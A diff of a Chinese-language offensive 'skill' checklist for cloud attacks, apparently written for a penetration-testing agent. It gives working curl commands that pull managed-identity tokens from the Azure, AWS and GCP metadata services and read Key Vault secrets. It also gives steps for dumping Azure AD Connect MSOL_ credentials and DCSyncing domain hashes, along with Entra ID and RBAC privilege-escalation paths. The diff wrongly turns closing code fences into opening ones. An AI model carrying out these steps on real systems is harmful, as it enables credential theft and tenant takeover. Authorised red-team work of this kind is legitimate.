@@ -12,9 +12,9 @@ metadata: { domain: cloud, tier: T2 }
 
 ## 0. 前置：识别云环境
 
-```
+```text
 # Azure
-[ ] env | grep -iE 'AZURE\|MSI\|IMDS\|IDENTITY'
+[ ] env | grep -iE 'AZURE|MSI|IMDS|IDENTITY'
 [ ] curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
 [ ] whoami → AzureAD\
 [ ] dir "C:\Program Files\Microsoft Monitoring Agent"  # Log Analytics / ARC
@@ -22,13 +22,13 @@ metadata: { domain: cloud, tier: T2 }
 # Entra ID (Azure AD)
 [ ] 域控安装了 Azure AD Connect → 本地 AD → 云横向
 [ ] 🔴 adconnectdump.py DOMAIN/ADMIN@CONNECT-SERVER → 提取 MSOL_ 凭据 → DCSync → 本地 DA = 云 GA
-```
+```text
 
 ---
 
 ## 1. Azure 元数据 API (IMDS)
 
-```
+```text
 # 获取 Azure Resource Manager token
 AZ_TOKEN=`curl -s -H "Metadata:true" \
   "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" \
@@ -46,7 +46,7 @@ VAULT_TOKEN=`curl -s -H "Metadata:true" \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])"`
 curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
   "https://<vault>.vault.azure.net/secrets/<secret>?api-version=7.2"
-```
+```text
 
 ---
 
@@ -54,7 +54,7 @@ curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
 
 ### 2.1 Azure AD Connect → 云横向
 
-```
+```text
 # 本地 AD → Entra ID 横向
 # 🔴 工具: adconnectdump.py (dirkjanm) — GitHub 可获取
 # adconnectdump.py DOMAIN/ADMIN-USER@CONNECT-SERVER-IP
@@ -64,20 +64,20 @@ curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
 [ ] C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll 存在?
 [ ] adconnectdump.py → 提取 encrypted_configuration → 解密 MSOL_ 密码
 [ ] 拿到 MSOL_ 密码 → DCSync → 所有域用户 NT hash
-```
+```text
 
 ### 2.2 CVE-2025-55241 Actor Token (CVSS 10.0, 已修复)
 
-```
+```text
 # 发现者: Dirk-jan Mollema (2025-07)
 # 原理: Actor Token (内部 S2S 模拟令牌) + 旧 Graph API 不验证来源 tenant
 # 影响: 任意租户 Global Admin — 绕过 MFA/CA/日志
 # 状态: Microsoft 2025-09 服务端修复, 无需客户操作
-```
+```text
 
 ### 2.3 其他 Entra ID 攻击面
 
-```
+```text
 # 应用注册 & Service Principals
 Get-MgServicePrincipal → 有高权限 SPN → 用其权限
 Get-MgApplication → 应用密钥/证书 → 窃取密码
@@ -88,13 +88,13 @@ Get-MgOauth2PermissionGrant → Delegated vs Application permissions
 
 # B2B 信任
 Get-MgCrossTenantAccessPolicy → 跨租户信任配置 → 跳板
-```
+```text
 
 ---
 
 ## 3. Azure RBAC 提权
 
-```
+```text
 # VM 上的 MI (Managed Identity) → 获取 token → 查 role assignments
 
 # 常见提权路径:
@@ -103,7 +103,7 @@ Get-MgCrossTenantAccessPolicy → 跨租户信任配置 → 跳板
 [ ] Storage Blob Data → 读源码/config → 发现更多凭据
 [ ] Logic App Contributor → 修改 workflow → 触发执行
 [ ] Automation Contributor → 创建/修改 Runbook → 执行脚本
-```
+```text
 
 ---
 
@@ -111,7 +111,7 @@ Get-MgCrossTenantAccessPolicy → 跨租户信任配置 → 跳板
 
 > 详见 aws-attack-surface skill
 
-```
+```text
 # 元数据
 curl http://169.254.169.254/latest/meta-data/
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
@@ -121,29 +121,29 @@ AWS_TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" \
   -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
 curl -s -H "X-aws-ec2-metadata-token: $AWS_TOKEN" \
   http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
-```
+```text
 
 ---
 
 ## 5. GCP 攻击面
 
-```
+```text
 # 元数据
 GCP_TOKEN=`curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
   -H "Metadata-Flavor: Google" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])"`
 curl -s -H "Authorization: Bearer $GCP_TOKEN" \
   "https://www.googleapis.com/compute/v1/projects"
-```
+```text
 
 ---
 
 ## 6. 🆕 云关键资源（2026 重点）
 
-```
+```text
 # AI/ML 资源 → SageMaker / Azure ML / Vertex AI → 训练脚本凭据注入
 # CI/CD 即服务 → GitHub Actions / CodeBuild → pipeline 注入
 # Serverless → Lambda / Azure Functions → 密钥硬编码 → IAM Role 横向
-```
+```text
 
 ---
 
